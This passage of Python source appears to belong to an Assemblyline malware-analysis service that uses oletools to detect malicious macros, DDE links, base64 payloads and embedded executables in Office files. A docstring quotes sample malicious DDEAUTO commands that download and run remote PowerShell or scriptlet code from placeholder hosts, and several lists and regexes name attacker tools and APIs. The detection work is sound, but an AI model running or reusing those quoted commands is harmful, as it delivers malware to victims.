import binascii
import email
import gzip
import hashlib
import json
import logging
import os
import re
import struct
import traceback
import unicodedata
import zipfile
import zlib

from collections import defaultdict
from typing import Dict, IO, List, Mapping, Optional, Set, Tuple

import magic
import olefile
import oletools.rtfobj as rtfparse
from oletools import mraptor, msodde, oleobj
from oletools.common import clsid
from oletools.oleid import OleID
from oletools.olevba import VBA_Parser, VBA_Scanner
from oletools.thirdparty.xxxswf import xxxswf

from assemblyline.common.iprange import is_ip_reserved
from assemblyline.common.str_utils import safe_str
from assemblyline_v4_service.common.balbuzard.patterns import PatternMatch
from assemblyline_v4_service.common.base import ServiceBase
from assemblyline_v4_service.common.request import ServiceRequest
from assemblyline_v4_service.common.result import Result, ResultSection, BODY_FORMAT, Heuristic
from assemblyline_v4_service.common.task import Task, MaxExtractedExceeded

from oletools_.cleaver import OLEDeepParser
from oletools_.pcodedmp import process_doc
from oletools_.stream_parser import Ole10Native, PowerPointDoc


class Oletools(ServiceBase):
    # OLEtools minimum version supported
    SUPPORTED_VERSION = "0.54.2"

    MAX_STRINGDUMP_CHARS = 500
    MIN_MACRO_SECTION_SCORE = 50

    # In addition to those from olevba.py
    ADDITIONAL_SUSPICIOUS_KEYWORDS = ('WinHttp', 'WinHttpRequest', 'WinInet', 'Lib "kernel32" Alias')

    # Extensions of interesting files
    FILES_OF_INTEREST = [b'.APK', b'.APP', b'.BAT', b'.BIN', b'.CLASS', b'.CMD', b'.DAT', b'.DLL', b'.EXE',
                         b'.JAR', b'.JS', b'.JSE', b'.LNK', b'.MSI', b'.OSX', b'.PAF', b'.PS1', b'.RAR',
                         b'.SCR', b'.SWF', b'.SYS', b'.TMP', b'.VBE', b'.VBS', b'.WSF', b'.WSH', b'.ZIP']

    # Safelists
    TAG_SAFELIST = [b"management", b"manager", b"microsoft.com"]
    # substrings of URIs to ignore
    URI_SAFELIST = [b"http://purl.org/", b"http://xml.org/", b".openxmlformats.org", b".oasis-open.org",
                    b".xmlsoap.org", b".microsoft.com", b".w3.org", b".gc.ca", b".mil.ca", b"dublincore.org"]
    # substrings at end of IoC to ignore (tuple to be compatible with .endswith())
    PAT_ENDS = (b"themeManager.xml", b"MSO.DLL", b"stdole2.tlb", b"vbaProject.bin", b"VBE6.DLL",
                b"VBE7.DLL")
    # Common blacklist false positives
    BLACKLIST_IGNORE = [b'connect', b'protect', b'background', b'enterprise', b'account', b'waiting', b'request']

    # Regex's
    DOMAIN_RE = b'^((?:(?:[a-zA-Z0-9-]+).)+[a-zA-Z]{2,5})'
    EXECUTABLE_EXTENSIONS_RE = rb"(?i)\.(EXE|COM|PIF|GADGET|MSI|MSP|MSC|VBS|VBE" \
                               rb"|VB|JSE|JS|WSF|WSC|WSH|WS|BAT|CMD|DLL|SCR" \
                               rb"|HTA|CPL|CLASS|JAR|PS1XML|PS1|PS2XML|PS2|PSC1|PSC2|SCF|SCT|LNK|INF|REG)\b"
    IP_RE = rb'^((?:(?:25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9]).){3}(?:25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9]))'
    URI_RE = rb'[a-zA-Z]+:/{1,3}[^/]+/[a-zA-Z0-9/\-.&%$#=~?_]+'
    EXCEL_BIN_RE = rb'(sheet|printerSettings|queryTable|binaryIndex|table)\d{1,12}\.bin'
    VBS_HEX_RE = rb'(?:&H[A-Fa-f0-9]{2}&H[A-Fa-f0-9]{2}){32,}'
    SUSPICIOUS_STRINGS = [
        # In maldoc.yara from decalage2/oledump-contrib/blob/master/
        (rb"(CloseHandle|CreateFile|GetProcAddr|GetSystemDirectory|GetTempPath|GetWindowsDirectory|IsBadReadPtr"
         rb"|IsBadWritePtr|LoadLibrary|ReadFile|SetFilePointer|ShellExecute|URLDownloadToFile|VirtualAlloc|WinExec"
         rb"|WriteFile)", b"use of suspicious system function"),
        # EXE
        (rb'This program cannot be run in DOS mode', b"embedded executable"),
        (rb'(?s)MZ.{32,1024}PE\000\000', b"embedded executable"),
        # Javascript
        (rb'(function\(|\beval[ \t]*\(|new[ \t]+ActiveXObject\(|xfa\.((resolve|create)Node|datasets|form)'
         rb'|\.oneOfChild)', b"embedded javascript")
    ]

    def __init__(self, config: Optional[Dict] = None) -> None:
        super().__init__(config)
        self._oletools_version = ''
        self.request: Optional[ServiceRequest] = None
        self.task: Optional[Task] = None
        self.sha = ''
        self.ole_result: Optional[Result] = None

        self.word_chains: Optional[Dict[str, Set[str]]] = None
        self.macro_skip_words: Set[str] = set()
        self.macro_words_re = re.compile("[a-z]{3,}")

        self.macro_score_max_size: Optional[int] = self.config.get('macro_score_max_file_size', None)
        self.macro_score_min_alert = self.config.get('macro_score_min_alert', 0.6)
        self.metadata_size_to_extract = self.config.get('metadata_size_to_extract', 500)
        self.ioc_pattern_safelist = [string.encode('utf-8', errors='ignore')
                                     for string in self.config.get('ioc_pattern_safelist', [])]
        self.ioc_exact_safelist = [string.encode('utf-8', errors='ignore')
                                   for string in self.config.get('ioc_exact_safelist', [])]
        self.pat_safelist: List[bytes] = []
        self.tag_safelist: List[bytes] = []

        self.patterns = PatternMatch()
        self.macros: List[str] = []
        self.pcode: List[str] = []
        self.extracted_clsids: Set[str] = set()
        self.excess_extracted: int = 0
        self.vba_stomping = False
        self.scored_macro_uri = False

    def start(self) -> None:

        self.log.debug("Service started")

        from oletools.olevba import __version__ as olevba_version
        from oletools.oleid import __version__ as oleid_version
        from oletools.rtfobj import __version__ as rtfobj_version
        from oletools.msodde import __version__ as msodde_version
        self._oletools_version = f"olevba v{olevba_version}, oleid v{oleid_version}, " \
                                 f"rtfobj v{rtfobj_version}, msodde v{msodde_version}"

        chain_path = os.path.join(os.path.dirname(__file__), "chains.json.gz")
        with gzip.open(chain_path) as f:
            self.word_chains = json.load(f)

        for k, v in self.word_chains.items():
            self.word_chains[k] = set(v)

        # Don't reward use of common keywords
        self.macro_skip_words = {'var', 'unescape', 'exec', 'for', 'while', 'array', 'object',
                                 'length', 'len', 'substr', 'substring', 'new', 'unicode', 'name', 'base',
                                 'dim', 'set', 'public', 'end', 'getobject', 'createobject', 'content',
                                 'regexp', 'date', 'false', 'true', 'none', 'break', 'continue', 'ubound',
                                 'none', 'undefined', 'activexobject', 'document', 'attribute', 'shell',
                                 'thisdocument', 'rem', 'string', 'byte', 'integer', 'int', 'function',
                                 'text', 'next', 'private', 'click', 'change', 'createtextfile', 'savetofile',
                                 'responsebody', 'opentextfile', 'resume', 'open', 'environment', 'write', 'close',
                                 'error', 'else', 'number', 'chr', 'sub', 'loop'}

    def get_tool_version(self) -> str:
        return self._oletools_version

    def extract_file(self, data: bytes, file_name: str, description: str) -> None:
        """
        Adds data as an extracted file

        Checks that there the service hasn't hit the extraction limit before extracting
        """
        if self.excess_extracted:
            self.excess_extracted += 1
        else:
            try:
                # If for some reason the directory doesn't exist, create it
                if not os.path.exists(self.working_directory):
                    os.makedirs(self.working_directory)
                file_path = os.path.join(self.working_directory, file_name)
                with open(file_path, 'wb') as f:
                    f.write(data)
                self.request.add_extracted(file_path, file_name, description)
            except MaxExtractedExceeded:
                self.excess_extracted += 1
            except Exception:
                self.log.error(f"Error extracting {file_name} for sample {self.sha}: {traceback.format_exc(limit=2)}")

    def check_for_patterns(self, data: bytes) -> Tuple[Mapping[str, Set[bytes]], bool]:
        """Use FrankenStrings module to find strings of interest.

        Args:
            data: Data to be searched.

        Returns:
            Dictionary of strings found by type and whether entity should be extracted (boolean).
        """
        extract = False
        found_tags = defaultdict(set)

        # Plain IOCs
        patterns_found = self.patterns.ioc_match(data, bogon_ip=True)
        for tag_type, iocs in patterns_found.items():
            for ioc in iocs:
                if any(string in ioc for string in self.pat_safelist) \
                        or ioc.endswith(self.PAT_ENDS) \
                        or ioc.lower() in self.tag_safelist:
                    continue
                # Skip .bin files that are common in normal excel files
                if not self.request.deep_scan and \
                        tag_type == 'file.name.extracted' and re.match(self.EXCEL_BIN_RE, ioc):
                    continue
                extract = extract or self.decide_extract(tag_type, ioc)
                found_tags[tag_type].add(ioc)

        return dict(found_tags), extract

    # noinspection PyBroadException
    def check_for_b64(self, data: bytes, dataname: str) -> Tuple[Optional[ResultSection], bool]:
        """Search and decode base64 strings in sample data.

        Args:
            data: Data to be searched.
            dataname: Name of data to place in AL result header.

        Returns:
            ResultSection with base64 results and whether results were found.
        """
        extract = False
        b64results = {}
        b64_extracted = set()
        b64_res: Optional[ResultSection] = None
        # Base64
        b64_matches = set()
        b64_ascii_content = []
        # '<[\x00]  [\x00]' Character found before some line breaks?? TODO: investigate sample and oletools
        for b64_match in re.findall(b'([\x20]{0,2}(?:[A-Za-z0-9+/]{10,}={0,2}[\r]?[\n]?){2,})',
                                    re.sub(b'\x3C\x00\x20\x20\x00', b'', data)):
            b64 = b64_match.replace(b'\n', b'').replace(b'\r', b'').replace(b' ', b'').replace(b'<', b'')
            if len(set(b64)) > 6:
                if len(b64) >= 16 and len(b64) % 4 == 0:
                    b64_matches.add(b64)
        """
        Using some selected code from 'base64dump.py' by Didier Stevens@https://DidierStevens.com
        """
        for b64_string in b64_matches:
            try:
                base64data = binascii.a2b_base64(b64_string)
                sha256hash = hashlib.sha256(base64data).hexdigest()
                if sha256hash in b64_extracted:
                    continue
                # Search for embedded files of interest
                if 500 < len(base64data) < 8000000:
                    m = magic.Magic(mime=True)
                    ftype = m.from_buffer(base64data)
                    if 'octet-stream' not in ftype:
                        self.extract_file(base64data,
                                          f"{sha256hash[0:10]}_b64_decoded",
                                          "Extracted b64 file during OLETools analysis")
                        b64results[sha256hash] = [len(b64_string), b64_string[0:50],
                                                  f"[Possible base64 file contents in {dataname}. "
                                                  "See extracted files.]", "", "", []]
                        extract = True
                        b64_extracted.add(sha256hash)
                        break
                # Dump the rest in results and its own file
                if len(base64data) > 30:
                    if all(c < 128 for c in base64data):
                        check_utf16 = base64data.decode('utf-16', 'ignore').encode('ascii', 'ignore')
                        if check_utf16 != b"":
                            asc_b64 = check_utf16
                        else:
                            # Filter printable characters then put in results
                            asc_b64 = bytes(i for i in base64data if 31 < i < 127)
                        # If data has less then 7 uniq chars then ignore
                        if len(set(asc_b64)) > 6 and len(re.sub(rb"\s", b"", asc_b64)) > 14:
                            tags = []
                            st_value = self.patterns.ioc_match(asc_b64, bogon_ip=True)
                            if len(st_value) > 0:
                                for ty, val in st_value.items():
                                    if val == "":
                                        asc_asc = unicodedata.normalize('NFKC', val) \
                                            .encode('ascii', 'ignore')
                                        tags.append((ty, asc_asc))
                                    else:
                                        ulis = list(set(val))
                                        for v in ulis:
                                            tags.append((ty, v))
                            extract = True
                            b64_ascii_content.append(asc_b64)
                            b64results[sha256hash] = [len(b64_string), b64_string[0:50], asc_b64,
                                                      base64data, dataname, tags]
            except Exception:
                pass

        b64index = 0
        if b64results:
            b64_res = ResultSection(f"Base64 in {dataname}:")
        for b64k, b64l in b64results.items():
            b64index += 1
            sub_b64_res = ResultSection(f"Result {b64index}", parent=b64_res)
            for tag in b64l[5]:
                sub_b64_res.add_tag(tag[0], tag[1])

            sub_b64_res.add_line(f'BASE64 TEXT SIZE: {b64l[0]}')
            sub_b64_res.add_line(f'BASE64 SAMPLE TEXT: {b64l[1]}[........]')
            sub_b64_res.add_line(f'DECODED SHA256: {b64k}')
            subb_b64_res = (ResultSection("DECODED ASCII DUMP:",
                                          body_format=BODY_FORMAT.MEMORY_DUMP,
                                          parent=sub_b64_res))
            subb_b64_res.add_line(b64l[2])
            if b64l[3] != "":
                st_value = self.patterns.ioc_match(b64l[3], bogon_ip=True)
                if len(st_value) > 0:
                    for ty, val in st_value.items():
                        if val == "":
                            asc_asc = unicodedata.normalize('NFKC', val).encode('ascii', 'ignore')
                            b64_res.add_tag(ty, asc_asc)
                        else:
                            ulis = list(set(val))
                            for v in ulis:
                                b64_res.add_tag(ty, v)

        if len(b64_ascii_content) > 0:
            all_b64 = b"\n".join(b64_ascii_content)
            b64_all_sha256 = hashlib.sha256(all_b64).hexdigest()
            self.extract_file(all_b64, f"b64_{b64_all_sha256}.txt", f"b64 for {dataname}")
        return b64_res, extract

    def execute(self, request: ServiceRequest) -> None:
        """Main Module. See README for details."""
        self.task = request.task
        request.result = Result()
        self.ole_result = request.result
        self.request = request
        self.sha = request.sha256
        self.scored_macro_uri = False
        self.extracted_clsids = set()

        self.macros = []
        self.pcode = []
        self.excess_extracted = 0
        self.vba_stomping = False

        if request.deep_scan:
            self.pat_safelist = self.URI_SAFELIST
            self.tag_safelist = self.TAG_SAFELIST
        else:
            self.pat_safelist = self.URI_SAFELIST + self.ioc_pattern_safelist
            self.tag_safelist = self.TAG_SAFELIST + self.ioc_exact_safelist

        path = request.file_path
        file_contents = request.file_contents

        try:
            self.check_for_indicators(path)
            self.check_for_dde_links(path)
            self.check_for_macros(path, file_contents, request.sha256)
            self.rip_mhtml(file_contents)
            self.extract_streams(path, file_contents)
            self.create_macro_sections(request.sha256)
            self.check_xml_strings(path)
        except Exception as e:
            self.log.error(f"We have encountered a critical error for sample {self.sha}: {str(e)}")

        if request.deep_scan:
            # Proceed with OLE Deep extraction
            parser = OLEDeepParser(path, request.result, self.log, request.task)
            # noinspection PyBroadException
            try:
                parser.run()
            except Exception as e:
                self.log.error("Error while deep parsing {path}: {str(e)}")
                section = ResultSection("Error deep parsing: {str(e)}")
                request.result.add_section(section)

        if self.excess_extracted:
            self.log.error(f"Too many files extracted for sample {self.sha}."
                           f" {self.excess_extracted} files were not extracted")
        request.set_service_context(self._oletools_version)

    def check_for_indicators(self, filename: str) -> None:
        """Finds and reports on indicator objects typically present in malicious files.

        Args:
            filename: Path to original OLE sample.
        """
        # noinspection PyBroadException
        try:
            ole_id = OleID(filename)
            indicators = ole_id.check()
            section = ResultSection("OleID indicators", heuristic=Heuristic(34))

            for indicator in indicators:
                # ignore these OleID indicators, they aren't all that useful
                if indicator.id in ("ole_format", "has_suminfo",):
                    continue

                if indicator.value is True:
                    if indicator.id not in ("word", "excel", "ppt", "visio"):
                        # good to know that the file types have been detected, but not a score-able offense
                        section.heuristic.add_signature_id(indicator.name)
                    section.add_line(indicator.name + ": " + indicator.description
                                     if indicator.description else indicator.name)

            if section.body:
                self.ole_result.add_section(section)
        except Exception:
            self.log.debug(f"OleID analysis failed for sample {self.sha}")

    # noinspection PyUnusedLocal
    def parse_uri(self, check_uri: bytes) -> Tuple[bool, bytes, List[Tuple[str, bytes]]]:
        """Use regex to determine if URI valid and should be reported.

        Args:
            check_uri: Possible URI string.

        Returns:
            True if the URI should score and the URI match if found.
        """
        tags: List[Tuple[str, bytes]] = []
        if isinstance(check_uri, str):
            check_uri = check_uri.encode('utf-8', errors='ignore')
        m = re.match(self.URI_RE, check_uri)
        if m is None:
            return False, b"", tags
        else:
            full_uri = m.group(0)

        proto, uri = full_uri.split(b'://', 1)
        if proto == b'file':
            return False, b"", tags

        if any(pattern in full_uri for pattern in self.pat_safelist):
            return False, m.group(0), tags

        tags.append(('network.static.uri', full_uri))

        domain = re.match(self.DOMAIN_RE, uri)
        ip = re.match(self.IP_RE, uri)
        if ip:
            ip_str = ip.group(1)
            if not is_ip_reserved(safe_str(ip_str)):
                tags.append(('network.static.ip', ip_str))
        elif domain:
            dom_str = domain.group(1)
            tags.append(('network.static.domain', dom_str))

        return True, m.group(0), tags

    def decide_extract(self, ty: str, val: bytes) -> bool:
        """Determine if entity should be extracted by filtering for highly suspicious strings.

        Args:
            ty: IOC type.
            val: IOC value (as bytes).

        Returns:
            Boolean value.
        """
        if ty == 'file.name.extracted':
            if val.startswith(b'oleObject'):
                return False
            _, ext = os.path.splitext(val)
            if ext and not ext.upper() in self.FILES_OF_INTEREST:
                return False
        elif ty == 'file.string.blacklisted':
            if val == b'http':
                return False

        # When deepscanning, do only minimal whitelisting
        if self.request.deep_scan:
            return True

        # common false positives
        if ty == 'file.string.api' and val.lower() == b'connect':
            return False
        if ty == 'file.string.blacklisted' and val.lower() in self.BLACKLIST_IGNORE:
            return False
        return True

    def check_xml_strings(self, path: str) -> None:
        """Search xml content for external targets, indicators, and base64 content.

        Args:
            path: Path to original sample.
        """
        xml_target_res = ResultSection("Attached External Template Targets in XML", heuristic=Heuristic(1))
        xml_ioc_res = ResultSection("IOCs content:", heuristic=Heuristic(7, frequency=0))
        xml_b64_res = ResultSection("Base64 content:")
        xml_big_res = ResultSection("Files too large to be fully scanned", heuristic=Heuristic(3, frequency=0))

        external_links: List[Tuple[bytes, bytes]] = []
        ioc_files: Mapping[str, List[str]] = defaultdict(list)
        # noinspection PyBroadException
        try:
            external_re = re.compile(rb'/([^"/]+)".{1,512}[Tt]arget="((?!file)[^"]+)".{1,512}'
                                     rb'[Tt]argetMode="External"', re.DOTALL)
            dde_re = re.compile(rb'ddeLink')
            script_re = re.compile(rb'script.{1,512}("JScript"|javascript)', re.DOTALL)
            xml_extracted = set()
            if not zipfile.is_zipfile(path):
                return # Not an Open XML format file
            with zipfile.ZipFile(path) as z:
                for f in z.namelist():
                    try:
                        data = z.open(f).read()
                    except zipfile.BadZipFile:
                        continue

                    if len(data) > 500000:
                        data = data[:500000]
                        xml_big_res.add_line(f'{f}')
                        xml_big_res.heuristic.increment_frequency()

                    has_external = external_re.findall(data) # Extract all files with external targets
                    external_links.extend(has_external)
                    has_dde = dde_re.search(data)  # Extract all files with dde links
                    has_script = script_re.search(data)  # Extract all files with javascript
                    extract_regex = bool(has_external or has_dde or has_script)

                    # Check for IOC and b64 data in XML
                    iocs, extract_ioc = self.check_for_patterns(data)
                    if iocs:
                        for tag_type, tags in iocs.items():
                            for tag in tags:
                                ioc_files[tag_type+safe_str(tag)].append(f)
                                xml_ioc_res.add_tag(tag_type, tag)

                    f_b64res, extract_b64 = self.check_for_b64(data, f)
                    if f_b64res:
                        f_b64res.set_heuristic(8)
                        xml_b64_res.add_subsection(f_b64res)

                    # all vba extracted anyways
                    if (extract_ioc or extract_b64 or extract_regex) and not f.endswith("vbaProject.bin"):
                        xml_sha256 = hashlib.sha256(data).hexdigest()
                        if xml_sha256 not in xml_extracted:
                            self.extract_file(data, xml_sha256, f"zipped file {f} contents")
                            xml_extracted.add(xml_sha256)
        except Exception:
            self.log.warning(f"Failed to analyze zipped file for sample {self.sha}: {traceback.format_exc()}")

        for link_type, link in set(external_links):
            link_type = safe_str(link_type)
            puri, duri, tag_list = self.parse_uri(link)
            if puri:
                xml_target_res.add_line(f'{link_type} link: {safe_str(duri)}')
                xml_target_res.heurisitic.add_signature_id(link_type)
            for tag_type, tag in tag_list:
                if tag_type == 'network.static.ip':
                    xml_target_res.heuristic.add_signature_id('ExternalLinkIP')
                xml_target_res.add_tag(tag_type, tag)

        if external_links:
            self.ole_result.add_section(xml_target_res)
        if xml_big_res.body:
            self.ole_result.add_section(xml_big_res)
        if xml_ioc_res.tags:
            for tag_type, res_tags in xml_ioc_res.tags.items():
                for res_tag in res_tags:
                    xml_ioc_res.add_line(f"Found the {tag_type.rsplit('.',1)[-1].upper()} string {res_tag} in:")
                    xml_ioc_res.add_lines(ioc_files[tag_type+res_tag])
                    xml_ioc_res.add_line('')
                    xml_ioc_res.heuristic.increment_frequency()
            self.ole_result.add_section(xml_ioc_res)
        if xml_b64_res.subsections:
            self.ole_result.add_section(xml_b64_res)

    @staticmethod
    def sanitize_filename(filename: str, replacement: str = '_', max_length: int = 200) -> str:
        """From rtfoby.py. Compute basename of filename. Replaces all non-whitelisted characters.

        Args:
            filename: Path to original sample.
            replacement: Character to replace non-whitelisted characters.
            max_length: Maximum length of the file name.

        Returns:
           Sanitized basename of the file.
        """
        basepath = os.path.basename(filename).strip()
        sane_fname = re.sub(r'[^\w.\- ]', replacement, basepath)

        while ".." in sane_fname:
            sane_fname = sane_fname.replace('..', '.')

        while "  " in sane_fname:
            sane_fname = sane_fname.replace('  ', ' ')

        if not len(filename):
            sane_fname = 'NONAME'

        # limit filename length
        if max_length:
            sane_fname = sane_fname[:max_length]

        return sane_fname

    @staticmethod
    def verifySWF(f: IO[bytes], x: int) -> Optional[bytes]:
        """Confirm that embedded flash content (SWF) has properties of the documented format.

        Args:
            f: Sample content.
            x: Start of possible embedded flash content.

        Returns:
           Flash content if confirmed, or None.
        """
        # Slightly modified code taken from oletools.thirdparty.xxpyswf verifySWF
        # Start of SWF
        f.seek(x)
        # Read Header
        header = f.read(3)
        # Read Version
        version = struct.unpack('<b', f.read(1))[0]
        # Read SWF Size
        size = struct.unpack('<i', f.read(4))[0]
        # Start of SWF
        f.seek(x)
        if version > 40 or not isinstance(size, int) or header not in ['CWS', 'FWS']:
            return None

        # noinspection PyBroadException
        try:
            if header == b'FWS':
                swf_data = f.read(size)
            elif header == b'CWS':
                f.read(3)
                swf_data = b'FWS' + f.read(5) + zlib.decompress(f.read())
            else:
                # TODO: zws -- requires lzma in python 2.7
                return None
            return swf_data
        except Exception:
            return None

    def extract_swf_objects(self, sample_file: IO[bytes]) -> bool:
        """Search for embedded flash (SWF) content in sample.

        Args:
            f: Sample content.

        Returns:
           If Flash content is found
        """
        swf_found = False
        # Taken from oletools.thirdparty.xxpyswf disneyland module
        # def disneyland(f, filename, options):
        retfind_swf = xxxswf.findSWF(sample_file)
        sample_file.seek(0)
        # for each SWF in file
        for x in retfind_swf:
            sample_file.seek(x)
            sample_file.read(1)
            sample_file.seek(x)
            swf = self.verifySWF(sample_file, x)
            if swf is None:
                continue
            swf_md5 = hashlib.sha256(swf).hexdigest()
            self.extract_file(swf, f'{swf_md5}.swf', "Flash file extracted during sample analysis")
            swf_found = True
        return swf_found

    def extract_vb_hex(self, encodedchunk: bytes) -> bool:
        """Attempts to convert possible hex encoding to ascii.

        Args:
            encodedchunk: Data that may contain hex encoding.

        Returns:
           True if hex content converted.
        """
        decoded = b''

        # noinspection PyBroadException
        try:
            while encodedchunk != b'':
                decoded += binascii.a2b_hex(encodedchunk[2:4])
                encodedchunk = encodedchunk[4:]
        except Exception:
            # If it fails, assuming not a real byte sequence
            return False
        hex_md5 = hashlib.sha256(decoded).hexdigest()
        self.extract_file(decoded, f'{hex_md5}.hex.decoded', 'Large hex encoded chunks detected during sample analysis')
        return True

    def flag_macro(self, macro_text: str) -> bool:
        """Determine proportion of randomized text in macro using chains.json. chains.json contains English trigraphs.
        We score macros on how commonly these trigraphs appear in code, skipping over some common keywords.

        Args:
            macro_text: Macro string content.

        Returns:
            True if the score is lower than self.macro_score_min_alert (indicating macro is possibly malicious).
        """

        if self.macro_score_max_size is not None and len(macro_text) > self.macro_score_max_size:
            return False

        macro_text = macro_text.lower()
        score = 0.0

        word_count = 0
        byte_count = 0

        for macro_word in self.macro_words_re.finditer(macro_text):
            word = macro_word.group(0)
            word_count += 1
            byte_count += len(word)
            if word in self.macro_skip_words:
                continue
            prefix = word[0]
            tri_count = 0
            for i in range(1, len(word) - 1):
                trigraph = word[i:i + 2]
                if trigraph in self.word_chains.get(prefix, []):
                    tri_count += 1
                prefix = word[i]

            score += tri_count / (len(word) - 2)

        if byte_count < 128 or word_count < 32:
            # these numbers are arbitrary, but if the sample is too short the score is worthless
            return False

        # A lower score indicates more randomized text, random variable/function names are common in malicious macros
        return (score / word_count) < self.macro_score_min_alert

    def mraptor_check(self, macros: List[str], filename: str, description: str,
                      request_hash: str) -> Tuple[bool, List[str]]:
        """ Extract macros and analyze with MacroRaptor

        macros: list of macros to check
        filename: filename for extracted file
        description: description for extracted file

        Returns: MacroRaptor scan of the macros
        """
        combined = '\n'.join(macros)
        if combined:
            data = combined.encode()
            combined_sha256 = hashlib.sha256(data).hexdigest()
            if combined_sha256 != request_hash:
                self.extract_file(data, f"{filename}_{combined_sha256[:15]}.data", description)

        rawr_combined = mraptor.MacroRaptor(combined)
        rawr_combined.scan()
        return rawr_combined.suspicious, rawr_combined.matches

    def create_macro_sections(self, request_hash: str) -> None:
        """ Creates result section for embedded macros of sample. Also extracts all macros and pcode content to
        individual files (all_vba_[hash].vba and all_pcode_[hash].data).

        Args:
            request_hash: Original submitted sample's sha256hash.
        """
        macro_section = ResultSection("OleVBA : Macros detected")
        macro_section.add_tag('technique.macro', "Contains VBA Macro(s)")
        subsections = []
        # noinspection PyBroadException
        try:
            auto_exec: Set[str] = set()
            suspicious: Set[str] = set()
            network: Set[str] = set()
            network_section = ResultSection("Potential host or network IOCs", heuristic=Heuristic(27, frequency=0))
            for vba_code in self.macros:
                analyzed_code = self.deobfuscator(vba_code)
                subsection = self.macro_section_builder(vba_code, analyzed_code)
                if (self.macro_scanner(analyzed_code, auto_exec, suspicious, network, network_section)
                        or subsection.heuristic):
                    subsections.append(subsection)
            if auto_exec:
                autoexecution = ResultSection("Autoexecution strings",
                                              heuristic=Heuristic(32),
                                              parent=macro_section,
                                              body='\n'.join(auto_exec))
                for keyword in auto_exec:
                    autoexecution.heuristic.add_signature_id(keyword)
            if suspicious:
                signatures = {keyword: 1 for keyword in suspicious
                              if keyword not in ('hex strings', 'base64 strings')}
                heuristic = Heuristic(30, signatures=signatures) if signatures else None
                macro_section.add_subsection(ResultSection("Suspicious strings or functions",
                                                           heuristic=heuristic,
                                                           body='\n'.join(suspicious)))
            if network:
                if network_section.heuristic.frequency == 0:
                    network_section.heuristic = None
                network_section.add_line('\n'.join(network))

            for subsection in subsections:  # Add dump sections after string sections
                macro_section.add_subsection(subsection)

            # Compare suspicious content macros to pcode, macros may have been stomped
            vba_sus, vba_matches = self.mraptor_check(self.macros, "all_vba", "vba_code", request_hash)
            pcode_sus, pcode_matches = self.mraptor_check(self.pcode, "all_pcode", "pcode", request_hash)

            if self.vba_stomping or pcode_matches and pcode_sus and not vba_sus:
                stomp_sec = ResultSection("VBA Stomping", heuristic=Heuristic(4))
                pcode_results = '\n'.join(m for m in pcode_matches if m not in set(vba_matches))
                if pcode_results:
                    stomp_sec.add_subsection(ResultSection("Suspicious content in pcode dump not found in macro dump:",
                                                           body=pcode_results))
                    stomp_sec.add_line("Suspicious VBA content different in pcode dump than in macro dump content.")
                    stomp_sec.heuristic.add_signature_id("Suspicious VBA stomped", score=500)
                    vba_stomp_sec = ResultSection("Suspicious content in macro dump:", parent=stomp_sec)
                    vba_stomp_sec.add_lines(vba_matches)
                    if not vba_matches:
                        vba_stomp_sec.add_line("None.")
                macro_section.add_subsection(stomp_sec)

        except Exception as e:
            self.log.debug(f"OleVBA VBA_Parser.detect_vba_macros failed for sample {self.sha}: "
                           f"{traceback.format_exc()}")
            section = ResultSection(f"OleVBA : Error parsing macros: {str(e)}")
            macro_section.add_subsection(section)
        if macro_section.subsections:
            self.ole_result.add_section(macro_section)

    def check_for_dde_links(self, filepath: str) -> None:
        """Use msodde in OLETools to report on DDE links in document.

        Args:
            filepath: Path to original sample.
        """
        # noinspection PyBroadException
        try:
            # TODO -- undetermined if other fields could be misused.. maybe do 2 passes, 1 filtered & 1 not
            links_text = msodde.process_file(filepath=filepath, field_filter_mode=msodde.FIELD_FILTER_DDE)

            # TODO -- Workaround: remove root handler(s) that was added with implicit log_helper.enable_logging() call
            logging.getLogger().handlers = []

            links_text = links_text.strip()
            if not links_text:
                return
            self.process_dde_links(links_text, self.ole_result)

        # Unicode and other errors common for msodde when parsing samples, do not log under warning
        except Exception as e:
            self.log.debug(f"msodde parsing for sample {self.sha} failed: {str(e)}")
            section = ResultSection("msodde : Error parsing document")
            self.ole_result.add_section(section)

    def process_dde_links(self, links_text: str, ole_result: Result) -> None:
        """Examine DDE links and report on malicious characteristics.

        Args:
            links_text: DDE link text.
            ole_section: OLE AL result.
        """
        ddeout_name = f'{self.sha}.ddelinks.original'
        self.extract_file(links_text.encode(), ddeout_name, "Original DDE Links")

        """ typical results look like this:
        DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\windows\\system32\\WindowsPowerShell
        \\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden -C $e=(new-object system.net.webclient).downloadstring
        ('http://bad.ly/Short');powershell.exe -e $e # " "Legit.docx"
        DDEAUTO c:\\Windows\\System32\\cmd.exe "/k powershell.exe -NoP -sta -NonI -W Hidden
        $e=(New-Object System.Net.WebClient).DownloadString('http://203.0.113.111/payroll.ps1');powershell
        -Command $e"
        DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\windows\\system32\\cmd.exe"
        "/c regsvr32 /u /n /s /i:\"h\"t\"t\"p://downloads.bad.com/file scrobj.dll" "For Security Reasons"
        """

        # To date haven't seen a sample with multiple links yet but it should be possible..
        dde_section = ResultSection("MSO DDE Links:", body_format=BODY_FORMAT.MEMORY_DUMP)
        dde_extracted = False
        looksbad = False

        suspicious_keywords = ('powershell.exe', 'cmd.exe', 'webclient', 'downloadstring', 'mshta.exe', 'scrobj.dll',
                               'bitstransfer', 'cscript.exe', 'wscript.exe')
        for line in links_text.splitlines():
            if ' ' in line:
                (link_type, link_text) = line.strip().split(' ', 1)

                # do some cleanup here to aid visual inspection
                link_type = link_type.strip()
                link_text = link_text.strip()
                link_text = link_text.replace(u'\\\\', u'\u005c')  # a literal backslash
                link_text = link_text.replace(u'\\"', u'"')
                dde_section.add_line(f"Type: {link_type}")
                dde_section.add_line(f"Text: {link_text}")
                dde_section.add_line("\n\n")
                dde_extracted = True

                data = links_text.encode()
                self.extract_file(data, f'{hashlib.sha256(data).hexdigest()}.ddelinks', "Tweaked DDE Link")

                link_text_lower = link_text.lower()
                if any(x in link_text_lower for x in suspicious_keywords):
                    looksbad = True

                dde_section.add_tag('file.ole.dde_link', link_text)
        if dde_extracted:
            dde_section.set_heuristic(16 if looksbad else 15)
            ole_result.add_section(dde_section)

    def check_for_macros(self, filename: str, file_contents: bytes, request_hash: str) -> None:
        """Use VBA_Parser in Oletools to extract VBA content from sample.

        Args:
            filename: Path to original sample.
